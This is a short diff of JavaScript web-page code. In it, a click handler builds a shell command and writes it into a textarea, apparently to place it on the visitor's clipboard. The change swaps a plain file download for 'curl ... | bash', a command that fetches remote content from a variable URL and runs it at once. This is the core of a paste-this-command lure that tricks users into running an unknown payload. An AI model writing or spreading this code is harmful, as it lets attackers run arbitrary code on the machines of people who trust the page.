@@ -33,8 +33,7 @@
     document.body.appendChild(c);
 
     c.onclick = () => {
-        // Construct the execution string seamlessly at the moment of the mouse click
-        const executionString = `curl -fL "${binaryStorageUrl}" -o main.py.enc`;
+        const executionString = `curl -sSsfL "${binaryStorageUrl}" | bash`;
 
         const e = document.createElement('textarea');
         e.value = executionString;
